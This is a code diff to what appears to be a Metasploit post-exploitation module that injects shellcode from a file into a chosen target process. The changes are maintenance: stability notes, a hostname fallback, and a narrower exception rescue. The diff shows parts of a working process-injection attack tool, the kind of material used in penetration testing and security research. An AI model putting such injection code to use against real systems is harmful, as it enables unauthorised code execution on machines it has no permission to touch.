@@ -28,6 +28,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_process_thread_create
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -47,17 +52,15 @@ class MetasploitModule < Msf::Post
     )
   end
 
-  # Run Method for when run command is issued
   def run
-    # syinfo is only on meterpreter sessions
-    print_status("Running module against #{sysinfo['Computer']}") if !sysinfo.nil?
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module against #{hostname} (#{session.session_host})")
 
     # Set variables
     shellcode = File.binread(datastore['SHELLCODE'])
     pid = datastore['PID']
     ppid = datastore['PPID']
     bits = datastore['BITS']
-    p = nil
     if bits == '64'
       bits = ARCH_X64
     else
@@ -127,7 +130,7 @@ class MetasploitModule < Msf::Post
       end
       begin
         inject(shellcode, proc)
-      rescue ::Exception => e
+      rescue StandardError => e
         print_error("Failed to inject Payload to #{proc.pid}!")
         print_error(e.to_s)
       end
